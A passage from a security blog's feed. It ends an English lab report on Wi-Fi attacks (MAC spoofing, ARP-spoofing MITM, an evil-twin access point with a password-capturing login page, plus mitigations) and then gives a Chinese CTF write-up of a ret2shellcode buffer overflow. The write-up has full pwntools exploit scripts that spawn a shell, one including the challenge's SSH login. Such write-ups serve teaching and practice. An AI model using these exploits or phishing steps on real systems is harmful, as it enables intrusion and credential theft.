mean that this kind of requests were not allowedby the router.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image22.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image23.png" class=""><p>After that, I tried another way, using “-K” parameter to try to leveragethe vulnerability of the router, but it was not useful as well, becausethis attack just can be used in some specific router version.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image24.png" class=""><p>So, just like what I mentioned before, this router cannot be attacked bythis method.</p><h3 id="Mitigation-measures"><a href="#Mitigation-measures" class="headerlink" title="Mitigation measures:"></a><strong>Mitigation measures:</strong></h3><p><strong>1. Disable WPS or WPS PIN:</strong> If WPS is not needed, disable it in therouter settings, especially the PIN method, which poses significantsecurity risks.</p><p><strong>2.Set up a whitelist for connected devices:</strong> Only allow known devicesto connect to the router.</p><p><strong>3.Monitor and audit the network:</strong> Analyse the network traffics, iffind anything unusual like request frequently, stop it and enhance thesecurity.</p><h2 id="3-3-Attacks-involving-mac-spoofing"><a href="#3-3-Attacks-involving-mac-spoofing" class="headerlink" title="3.3 Attacks involving mac spoofing"></a><strong>3.3 Attacks involving mac spoofing</strong></h2><h3 id="Principle-2"><a href="#Principle-2" class="headerlink" title="Principle:"></a><strong>Principle:</strong></h3><p>WI-FI MAC Spoofing is a technique that involves spoofing a device’s MACaddress to carry out an attack. Since MAC address servers as the uniqueidentifier for devices on a LAN network, if an attacker changes theirdevices’ MAC address to match that of a target device, they may be ableto impersonate the target device, which enable man-in-the-middle attackor bypass security measures that relay on MAC address.</p><h3 id="Attack-process：-2"><a href="#Attack-process：-2" class="headerlink" title="Attack process："></a><strong>Attack process：</strong></h3><p>I used the tool called <strong>airodump-ng</strong> to sniff the network and find thetarget that I wanted to attack. I could see that the BSSID of the**”MikroTik-wenbo”** is D4:01:C3:84:95:A1.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image25.png" class=""><p>My purpose was to spoof a device’s mac address in this network, so that,I could bypass some authorization mechanism based on the mac.</p><p>Next step, I needed to know the mac of the devices in this network. So,I used the same tool and specify the BSSID and channel.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image26.png" class=""><p>The “STATION” column showed all the devices connecting to this WI-FI.Because I knew the second one is my host machine, the first one must bethe raspberry, which simulated the victim.</p><p>I used “ip a” command to check the mac of wlan0, we could find that theMAC address was 86:8C:51:E4:E0:0A and the status of this interface isDOWN.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image27.png" class=""><p>Then I used a tool called <strong>macchanger</strong> to change the MAC of myinterface wlan0 to the victim’s MAC: D8:3A:DD:AF:6B:72</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image28.png" class=""><p>I needed to up this interface wlan0 and check my result of change.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image29.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image30.png" class=""><p>I used Wireshark to monitor the traffics destined for this interfacewlan0. From the result of the traffics, I could find that there was arecord that should be sent to the raspberry but was sent to my laptop,which meant that my spoofing was successful.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image31.png" class=""><h3 id="Mitigation-measures-1"><a href="#Mitigation-measures-1" class="headerlink" title="Mitigation measures:"></a><strong>Mitigation measures:</strong></h3><p><strong>1.Disable MAC-based authentication</strong>: Use stronger way to identify thedevices in the network, such as certificate-based authentication.</p><p><strong>2.Bind MAC address and IP in the network:</strong> Make sure that each MACaddress corresponds to a unique IP, and block the cases of duplication.</p><p><strong>3.Enable WPA3 encryption:</strong> WPA3 provides stronger encryption andauthentication mechanisms, making it difficult for attacker to decryptnetwork communications even if a MAC address is spoofed.</p><h2 id="3-4-Man-in-the-middle-attack"><a href="#3-4-Man-in-the-middle-attack" class="headerlink" title="3.4 Man in the middle attack"></a><strong>3.4 Man in the middle attack</strong></h2><h3 id="Principle-3"><a href="#Principle-3" class="headerlink" title="Principle:"></a><strong>Principle:</strong></h3><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image32.png" class=""><p>Wi-Fi Man-in-the-Middle (MITM) is an attack that intercepts wirelesscommunication to eavesdrop on or tamper with its content. The attackerdevice deceives one party into believing that they are the other,positioning itself invisibly in the middle. A common technique used forthis is ARP spoofing.</p><p>ARP is a protocol that transfer Ip address to MAC address, but thisprotocol does not have any certification mechanism. Attacker canbroadcast a disguised ARP response to the LAN and impersonate the routerand the victim. After that, all the traffic between the victim and therouter will pass through the attacker’s device, which can allow attackereavesdrops on or tamper with its content.</p><h3 id="Attack-process：-3"><a href="#Attack-process：-3" class="headerlink" title="Attack process："></a><strong>Attack process：</strong></h3><p>I started the monitor mode of the wlan0 first.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image33.png" class=""><p>Then I used the tool <strong>arpspoof</strong> to spoof the gateway 192.168.88.1 thatI was the victim 192.168.88.184 and spoof the victim that I was thegateway at the same time.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image34.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image35.png" class=""><p>Of course, I needed configure the network forward to make sure I cantransfer the requests from victim to the gateway, so that I could hideme between the target devices.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image36.png" class=""><p>I tested whether my attack was successful or not. I pinged the gatewayfrom the client and saw the records in the Wireshark. From the diagrambelow we can see, requests sent and received the response successfully.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image37.png" class=""><p>From the Wireshark, when I used the filter ICMP and specified an IPaddress we can see the ping records successfully.</p><p>So, I could make sure that I successfully implement this MITM attack.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image38.png" class=""><h3 id="Mitigation-measures-2"><a href="#Mitigation-measures-2" class="headerlink" title="Mitigation measures:"></a><strong>Mitigation measures:</strong></h3><p><strong>1.Implement Network Isolation:</strong> Separate networks with high-securityrequirements from those with lower security demands. Use certificatesfor authentication to ensure that connected devices are legitimate. Thisalso helps limit the scope of ARP attacks.</p><p><strong>2.Conduct Network Auditing and Monitoring</strong>: Utilize monitoring toolsand auditing rules designed to detect and block malicious activities,such as forged certificates or spoofed MAC addresses within the network.</p><p><strong>3.Bind MAC address and IP in the network:</strong> Make sure that each MACaddress corresponds to a unique IP, and block the cases of duplication.</p><p><strong>4. Enable WPA3 encryption:</strong> WPA3 provides stronger encryption andauthentication mechanisms, making it difficult for attacker to decryptnetwork communications even if a MAC address is spoofed.</p><h2 id="3-5-Network-spoofing-attacks-Evil-Twin-AP"><a href="#3-5-Network-spoofing-attacks-Evil-Twin-AP" class="headerlink" title="3.5 Network spoofing attacks (Evil Twin AP)"></a><strong>3.5 Network spoofing attacks (Evil Twin AP)</strong></h2><h3 id="Principle-4"><a href="#Principle-4" class="headerlink" title="Principle"></a><strong>Principle</strong></h3><p>Evil Twin AP is a wireless attack that involves creating a fake accesspoint. The attacker sets up an access point with a known Wi-Fi name todeceive victims into connecting to the malicious AP, thereby stealinguser information or conducting a man-in-the-middle attack.</p><h3 id="Attack-process：-4"><a href="#Attack-process：-4" class="headerlink" title="Attack process："></a><strong>Attack process：</strong></h3><p>I started the monitor mode of the wlan0 first</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image39.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image40.png" class=""><p>I used the <strong>airodump-ng</strong> wlan0mon command to sniff the network andfound the target that i needed to attack, this time is**”MikroTik-wenbo”,** and this step created a new interface at0.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image41.png" class=""><p>I started at0 and assign a Ip address.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image42.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image43.png" class=""><p>I configured the DHCP to make sure that the victim would be assigned aIp address when it connected to this evil interface.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image44.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image45.png" class=""><p>I used <strong>airbase-ng</strong> to create a disguised AP and waited some victim toconnect. I started the Wireshark in the interface at0 at the same time.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image46.png" class=""><p>In this scenario, I used the host machine to simulate the victim andconnect to it. We can see that someone has connected and was assigned aIp: 192.168.1.50</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image47.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image48.png" class=""><p>The attack is not over yet, I constructed a disguised Wi-Fi to tricksome sensitive information from victims. So, I created a login page inthe kali and used python to create a http server in port 80, which couldredirect the victims to the login page to force them enter theirpassword.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image49.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image50.png" class=""><p>To make this attack more realistic, I used <strong>iptables</strong> to configure therequests redirection, ensuring that any request initiated by devicesconnected to this fake WI-FI was redirected to the service I set up.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image51.png" class=""><p>When user input their information in the form, this information will besent to the root path of the server, and we can see them from the log orthe Wireshark.</p><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image52.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image53.png" class=""><img src="/2025/04/25/Wireless-security-vulnerability-exploit/image54.png" class=""><h3 id="Mitigation-measures-3"><a href="#Mitigation-measures-3" class="headerlink" title="Mitigation measures:"></a><strong>Mitigation measures:</strong></h3><ol><li><p><strong>Monitor and audit wireless network:</strong> detect and block any    abnormal WIFI AP in the network, such as WIFI with the same name of    the known WIFI.</p></li><li><p><strong>Avoiding to connecting to the open WI-FI:</strong> Open WIFI hotpots have    higher security risk and should not be connected to.</p></li><li><p><strong>Only enter sensitive information on HTTPS websites:</strong> HTTP    protocol transmit information in plain text, which is easier for    man-in-the-middle-attack.</p></li></ol><h1 id="4-References"><a href="#4-References" class="headerlink" title="4. References"></a><strong>4. References</strong></h1><p>Agency, N. S. (2023, Febrary 01). Best Practices for Securing Your HomeNetwork. Retrieved from National Security Agency:<a href="https://media.defense.gov/2023/Feb/22/2003165170/-1/-1/0/CSI_BEST_PRACTICES_FOR_SECURING_YOUR_HOME_NETWORK.PDF">https://media.defense.gov/2023/Feb/22/2003165170/-1/-1/0/CSI_BEST_PRACTICES_FOR_SECURING_YOUR_HOME_NETWORK.PDF</a></p><p>Beaver, K., &amp; T. Davis, P. ( 2005). Hacking Wireless Networks FORDUMMIES. Hoboken: Wiley Publishing, Inc.</p><p>CyberKid. (2024, 09 04). Guide to Check Your Router’s Security withWifite. Retrieved from Medium:<a href="https://medium.com//@redfanatic7/guide-to-check-your-routers-security-with-wifite-461897e66c98">https://medium.com/\@redfanatic7/guide-to-check-your-routers-security-with-wifite-461897e66c98</a></p><p>cybersecura. (2022, 09 16). WPA&#x2F;WPA2 cracking, PMKID, Evil Twin...Overview of attacks and threats to Wi-Fi in 2022. Retrieved fromcybersecura:<a href="https://www.cybersecura.com/en/post/overview-of-attacks-and-threats-to-wifi-in-2022">https://www.cybersecura.com/en/post/overview-of-attacks-and-threats-to-wifi-in-2022</a></p><p>Deshmukh, A. (2024, 04 01). Wireless Penetration Testing ComprehensiveGuide. Retrieved from Medium:<a href="https://rootissh.in/wireless-penetration-testing-comprehensive-guide-4eaa96096892">https://rootissh.in/wireless-penetration-testing-comprehensive-guide-4eaa96096892</a></p><p>Ledesma, J. (2023, June 16). Evil Twin Attack: What it is, How to Detect&amp; Prevent it. Retrieved from varonis:<a href="https://www.varonis.com/blog/evil-twin-attack">https://www.varonis.com/blog/evil-twin-attack</a></p><p>outpost24. (2024, 11 08). How hackers use Reaver to exploit WPS andcrack WPA networks. Retrieved from outpost24:<a href="https://outpost24.com/blog/wps-cracking-with-reaver/">https://outpost24.com/blog/wps-cracking-with-reaver/</a></p><p>R1nger. (2022, November 2). Deauthentication Attack using Kali Linux.Retrieved from sudorealm:<a href="https://sudorealm.com/blog/deauthentication-attack-using-kali-linux">https://sudorealm.com/blog/deauthentication-attack-using-kali-linux</a></p>]]></content>
    
    
    <categories>
      
      <category>无线安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2shellcode</title>
    <link href="/2025/03/11/ret2shellcode/"/>
    <url>/2025/03/11/ret2shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>闲来无事做几个简单的pwn玩玩: ret2shellcode</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2025/03/11/ret2shellcode/challenge1.png" class=""><img src="/2025/03/11/ret2shellcode/challenge2.png" class=""><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;inttypes.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br><br>int main(int argc, char **argv)<br>&#123;<br>    // This prevents /bin/sh from dropping the privileges<br>    setreuid(geteuid(), geteuid());<br><br>        unsigned long int n;<br>        char *endchar;<br>        char buf[64];<br><br>        if (argc != 2)<br>        &#123;<br>                fprintf(stderr, &quot;Please give a number\n&quot;);<br>                return 1;<br>        &#125;<br><br>        /* Convert the user&#x27;s number to an integer */<br>        n = strtoumax(argv[1], &amp;endchar, 10);<br><br>        printf(&quot;buffer is at %p\n&quot;, buf);<br><br>        if (read(STDIN_FILENO, buf, n) == 0)<br>                return 1;<br><br>        return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="确认系统保护开启状态"><a href="#确认系统保护开启状态" class="headerlink" title="确认系统保护开启状态"></a>确认系统保护开启状态</h2><p>文件下载下来，并使用 checksec 查看，可以看到都是关闭状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">scp pwn025@pwn.baectf.com:/home/pwn025/runme ./runme<br>checksec runm<br></code></pre></td></tr></table></figure><img src="/2025/03/11/ret2shellcode/checksec.png" class=""><p>检查文件平台为 x86-64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ubuntu@VM-0-10-ubuntu:~/ctf/stackoverflow/ret2shellcode$ file runme <br>runme: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=49c714829f0e52ddd585916e4ec5d462a4ccee4a, not stripped<br></code></pre></td></tr></table></figure><h2 id="技术讲解"><a href="#技术讲解" class="headerlink" title="技术讲解"></a>技术讲解</h2><p>我们的攻击方法可以简单分成3个部分来解释：</p><ol><li>对程序发送一段超过buffer长度的字串，产生overflow。</li><li>因为overflow部分会继续被写入内存，最终会覆盖到内存中的return address，使其指向我们想要执行的shellcode。</li><li>当程式执行完毕return时，就会被导向错误的内存地址，继续执行我们植入的shellcode。</li></ol><p>简单图解：(关于buffer overflow更详细的原理解释，可以参考<a href="#References">reference</a>中的前两个连结)</p><img src="/2025/03/11/ret2shellcode/tech1.png" class=""><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; disassemble main<br>Dump of assembler code for function main:<br>   0x00000000000011e9 &lt;+0&gt;:     endbr64 <br>   0x00000000000011ed &lt;+4&gt;:     push   rbp<br>   0x00000000000011ee &lt;+5&gt;:     mov    rbp,rsp<br>   0x00000000000011f1 &lt;+8&gt;:     push   rbx<br>   0x00000000000011f2 &lt;+9&gt;:     sub    rsp,0x68<br>   0x00000000000011f6 &lt;+13&gt;:    mov    DWORD PTR [rbp-0x64],edi<br>   0x00000000000011f9 &lt;+16&gt;:    mov    QWORD PTR [rbp-0x70],rsi<br>   0x00000000000011fd &lt;+20&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001202 &lt;+25&gt;:    mov    ebx,eax<br>   0x0000000000001204 &lt;+27&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001209 &lt;+32&gt;:    mov    esi,ebx<br>   0x000000000000120b &lt;+34&gt;:    mov    edi,eax<br>   0x000000000000120d &lt;+36&gt;:    call   0x10d0 &lt;setreuid@plt&gt;<br>   0x0000000000001212 &lt;+41&gt;:    cmp    DWORD PTR [rbp-0x64],0x2<br>   0x0000000000001216 &lt;+45&gt;:    je     0x1242 &lt;main+89&gt;<br>   0x0000000000001218 &lt;+47&gt;:    mov    rax,QWORD PTR [rip+0x2e01]        # 0x4020 &lt;stderr@GLIBC_2.2.5&gt;<br>   0x000000000000121f &lt;+54&gt;:    mov    rcx,rax<br>   0x0000000000001222 &lt;+57&gt;:    mov    edx,0x15<br>   0x0000000000001227 &lt;+62&gt;:    mov    esi,0x1<br>   0x000000000000122c &lt;+67&gt;:    lea    rax,[rip+0xdd1]        # 0x2004<br>   0x0000000000001233 &lt;+74&gt;:    mov    rdi,rax<br>   0x0000000000001236 &lt;+77&gt;:    call   0x10f0 &lt;fwrite@plt&gt;<br>   0x000000000000123b &lt;+82&gt;:    mov    eax,0x1<br>   0x0000000000001240 &lt;+87&gt;:    jmp    0x12a6 &lt;main+189&gt;<br>   0x0000000000001242 &lt;+89&gt;:    mov    rax,QWORD PTR [rbp-0x70]<br>   0x0000000000001246 &lt;+93&gt;:    add    rax,0x8<br>   0x000000000000124a &lt;+97&gt;:    mov    rax,QWORD PTR [rax]<br>   0x000000000000124d &lt;+100&gt;:   lea    rcx,[rbp-0x20]<br>   0x0000000000001251 &lt;+104&gt;:   mov    edx,0xa<br>   0x0000000000001256 &lt;+109&gt;:   mov    rsi,rcx<br>   0x0000000000001259 &lt;+112&gt;:   mov    rdi,rax<br>   0x000000000000125c &lt;+115&gt;:   call   0x10e0 &lt;strtoumax@plt&gt;<br>   0x0000000000001261 &lt;+120&gt;:   mov    QWORD PTR [rbp-0x18],rax<br>   0x0000000000001265 &lt;+124&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001269 &lt;+128&gt;:   mov    rsi,rax<br>   0x000000000000126c &lt;+131&gt;:   lea    rax,[rip+0xda7]        # 0x201a<br>   0x0000000000001273 &lt;+138&gt;:   mov    rdi,rax<br>   0x0000000000001276 &lt;+141&gt;:   mov    eax,0x0<br>   0x000000000000127b &lt;+146&gt;:   call   0x10a0 &lt;printf@plt&gt;<br>   0x0000000000001280 &lt;+151&gt;:   mov    rdx,QWORD PTR [rbp-0x18]<br>   0x0000000000001284 &lt;+155&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001288 &lt;+159&gt;:   mov    rsi,rax<br>   0x000000000000128b &lt;+162&gt;:   mov    edi,0x0<br>   0x0000000000001290 &lt;+167&gt;:   call   0x10c0 &lt;read@plt&gt;<br>   0x0000000000001295 &lt;+172&gt;:   test   rax,rax<br>   0x0000000000001298 &lt;+175&gt;:   jne    0x12a1 &lt;main+184&gt;<br>   0x000000000000129a &lt;+177&gt;:   mov    eax,0x1<br>   0x000000000000129f &lt;+182&gt;:   jmp    0x12a6 &lt;main+189&gt;<br>   0x00000000000012a1 &lt;+184&gt;:   mov    eax,0x0<br>   0x00000000000012a6 &lt;+189&gt;:   mov    rbx,QWORD PTR [rbp-0x8]<br>   0x00000000000012aa &lt;+193&gt;:   leave  <br>   0x00000000000012ab &lt;+194&gt;:   ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>根据 IDA的反编译我们也可以看到  buf 的地址就是这个位置，将buf地址复制给到 rsi 作为函数的第二个参数，使用快捷键B可以看到相对于 ebp 的地址偏移位 60h</p><img src="/2025/03/11/ret2shellcode/static-analysis1.png" class=""><img src="/2025/03/11/ret2shellcode/static-analysis2.png" class=""><p>根据函数调用的调用范式，我们知道返回地址大概率存在于 rbp+0x8的位置，也就是 buf 和 retrun 的相对距离为 68h, 但是为了确定我们再动态调试进行计算看看是否如我们所料</p><p>我们构造一个超长的payload，让程序崩溃</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python3 -c &#x27;print(&quot;A&quot; * 200)&#x27; &gt; payload.txt<br></code></pre></td></tr></table></figure><p>使用 gdb 进行调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb<br>file ret2shellcode<br>run 200 &lt; payload.txt<br></code></pre></td></tr></table></figure><p>可以看到 rsp 此时的地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">rsp:0x7fffffffe2c8<br>buf:0x7fffffffe260<br></code></pre></td></tr></table></figure><p>为什么要这么调试呢，我们知道函数最后是 leave 和 ret , leave 的作用是退栈，也就是还原栈的位置，相当于下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">mov esp ebp<br>pop ebp<br></code></pre></td></tr></table></figure><p>ret 则是负责 return 到之前存储的返回地址，相当于下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">pop rax<br>jmp rax<br></code></pre></td></tr></table></figure><p>而这里的 pop 就是把 rsp 指向的地址的内容 pop出来，这个地址内容就是return的目标地址，因此 rsp 的地址就是 return 地址的存储位置，也就是我们要覆盖的地址空间</p><img src="/2025/03/11/ret2shellcode/pwn1.png" class=""><p>同理我们下断点进行调试，当断点执行到 ret 指令的时候我们查看 rsp 的值，这样我们也能获得到对应的 return 地址所在的地址空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">b read //在read 函数下断点<br>run<br>ni<br></code></pre></td></tr></table></figure><img src="/2025/03/11/ret2shellcode/pwn2.png" class=""><p>或者使用 pwntools 的 cyclic 生成字符帮我们计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic 200<br>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa<br>// 将字符复制到 payload2.txt 中，并开启调试<br>run 200 &lt; payload2.txt<br></code></pre></td></tr></table></figure><p>找到被覆盖的位置，并把覆盖的值输入 cyclic 让他帮我们计算</p><img src="/2025/03/11/ret2shellcode/pwn3.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic -l 0x616161616161616e<br></code></pre></td></tr></table></figure><img src="/2025/03/11/ret2shellcode/pwn4.png" class=""><p>可以看到计算的结果 104 就等于我们之前算到的 68h，至此，我们可以分析得出，我们的payload的长度为 68h+8h 字节，接下来我们要分析shellcode</p><p>shellcode 是一段16进制的代码，可以直接注入内存并被直接执行，简单的shellcode目前有现成的平台供我们搜索：<a href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a>(shell-storm上有非常多针对不同的作业系统和CPU，执行不同功能的shellcode，我们只要在网站上，根据我们的作业系统及CPU指令集选择合适的shellcode来用即可)， 或者对于我们只需要执行&#x2F;bin&#x2F;sh 我们可以直接使用pwntools 为我们提供的能力</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffea00)<br></code></pre></td></tr></table></figure><blockquote><p>下面我们看下 shellcode 的长度是不是超过了 104，只有48 是满足要求的</p><blockquote><blockquote><blockquote><p>len(asm(shellcraft.amd64.linux.sh(), arch&#x3D;’amd64’))   </p></blockquote></blockquote></blockquote><p>48                  </p></blockquote><p>构造我们的本地调试的 exp.py</p><blockquote><p>我们分析的时候程序的 buf 地址发生了一些变化，但是整体的相对地址是不会变化的，这里我们只需要在脚本里修改一下即可</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># 设置连接信息<br>executable_path = &#x27;./ret2shellcode&#x27;  # 可执行文件的路径<br><br># payload 构造<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffe2d0)<br><br>target_program = process([executable_path, &#x27;200&#x27;])<br><br>target_program.sendline(payload)<br><br>try:<br>    # 设置超时时间为 5 秒<br>    output = target_program.recv(timeout=5)  # 接收最多 5 秒的输出<br>    print(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    print(f&quot;Error: &#123;e&#125;&quot;)<br><br># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式<br>target_program.interactive()<br></code></pre></td></tr></table></figure><p>远程的代码，要使用到 ssh连接，并且 buf 地址也是不一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># 设置连接信息<br>target_ip = &#x27;pwn.baectf.com&#x27;  # 远程主机的 IP 地址<br>target_port = 22  # 默认的 SSH 端口<br>username = &#x27;pwn025&#x27;  # SSH 用户名<br>password = &#x27;butterscotchtopping&#x27;  # SSH 密码<br>executable_path = &#x27;./runme&#x27;  # 可执行文件的路径<br><br># payload 构造<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffea40)<br><br><br># 通过 SSH 连接到远程主机<br>p = ssh(host=target_ip, user=username, password=password, port=target_port)<br><br># 在远程主机上执行可执行文件，并传递 payload 作为命令行参数<br>target_program = p.process([executable_path, &#x27;200&#x27;])<br><br>target_program.sendline(payload)<br><br>try:<br>    # 设置超时时间为 5 秒<br>    output = 